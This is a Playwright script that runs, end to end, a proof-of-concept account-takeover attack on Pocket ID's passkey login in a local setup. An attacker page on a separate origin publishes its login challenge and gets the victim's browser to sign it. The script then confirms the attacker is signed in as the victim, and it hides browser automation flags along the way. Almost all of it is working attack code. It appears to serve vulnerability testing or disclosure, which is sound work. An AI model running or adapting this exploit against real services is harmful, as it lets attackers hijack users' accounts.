// End-to-end check of the frontend nonce-hijack against Pocket ID.
//   attacker tab (/attacker): starts a login, publishes the nonce, waits.
//   victim (/login): enrolls, then signs the attacker's nonce; their own login fails.
//   attacker tab: finishes with that assertion and ends up signed in AS the victim.
import { chromium } from 'playwright';

const APP = process.env.APP || 'http://localhost:1411';   // the website (Acme)
const ATT = process.env.ATT || 'http://127.0.0.1:1413';    // the attacker's separate site
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const V = { username: 'taylor' + Date.now().toString().slice(-5), first: 'Taylor', last: 'Reed' };
V.email = V.username + '@demo.local';
const log = (...a) => console.log('·', ...a);

async function newCtx(browser, withAuth) {
  const ctx = await browser.newContext({ userAgent: UA, viewport: { width: 1100, height: 860 } });
  await ctx.addInitScript(() => { Object.defineProperty(navigator, 'webdriver', { get: () => false }); });
  const page = await ctx.newPage();
  page.on('console', (m) => { if (/error|fail|exception/i.test(m.text())) console.log(`  [${withAuth ? 'victim' : 'attacker'}] ${m.text()}`); });
  page.on('pageerror', (e) => console.log(`  [${withAuth ? 'victim' : 'attacker'} pageerror] ${e.message}`));
  if (withAuth) {
    const client = await ctx.newCDPSession(page);
    await client.send('WebAuthn.enable');
    await client.send('WebAuthn.addVirtualAuthenticator', { options: {
      protocol: 'ctap2', transport: 'internal', hasResidentKey: true,
      hasUserVerification: true, isUserVerified: true, automaticPresenceSimulation: true } });
  }
  return { ctx, page };
}

const browser = await chromium.launch({ headless: true });
const vic = await newCtx(browser, true);
const att = await newCtx(browser, false);
let pass = false;
try {
  // 1) Victim enrolls a passkey on the app's /login page.
  await vic.page.goto(`${APP}/login`, { waitUntil: 'domcontentloaded' });
  await vic.page.click('#setup summary');
  await vic.page.fill('#first', V.first); await vic.page.fill('#last', V.last);
  await vic.page.fill('#username', V.username); await vic.page.fill('#email', V.email);
  await vic.page.click('#enroll');
  await vic.page.waitForFunction(() => /passkey added/i.test(document.getElementById('setupStatus')?.textContent || ''), null, { timeout: 30000 });
  log('victim enrolled');

  // 2) Attacker tab (separate origin) arms: starts a login and publishes the nonce to its drop.
  await att.page.goto(`${ATT}/attacker`, { waitUntil: 'domcontentloaded' });
  await att.page.waitForFunction(async () => {
    try { const o = await (await fetch('/x/offer')).json(); return !!o.challenge; } catch { return false; }
  }, null, { timeout: 10000 });
  log('attacker armed (nonce published)');

  // 3) Victim signs the attacker's nonce; their own sign-in fails.
  await vic.page.click('#go');
  try {
    await vic.page.waitForFunction(() => /did not work/i.test(document.getElementById('status')?.textContent || ''), null, { timeout: 20000 });
  } catch (e) {
    console.error('victim #status =', JSON.stringify((await vic.page.textContent('#status'))?.trim()));
    throw e;
  }
  log('victim signed; victim sees failure (no session for them)');

  // 4) Attacker tab finishes and lands in the victim's account on the same site.
  await att.page.waitForFunction(() => document.getElementById('home')?.style.display === 'block', null, { timeout: 15000 });
  const openName = (await att.page.textContent('#hname'))?.trim();
  const email = (await att.page.textContent('#hemail'))?.trim();
  log('attacker is signed in as:', JSON.stringify({ openName, email }));

  pass = openName === `${V.first} ${V.last}` && email === V.email;
} catch (e) {
  console.error('FAILED:', e.message);
  try { console.error('attacker view:', (await att.page.textContent('.card'))?.replace(/\s+/g, ' ').slice(0, 300)); } catch {}
} finally {
  console.log(pass ? '\nPASS: victim signed the attacker nonce; attacker finished and is in the victim account on the same site.' : '\nFAIL (see above).');
  await browser.close();
}
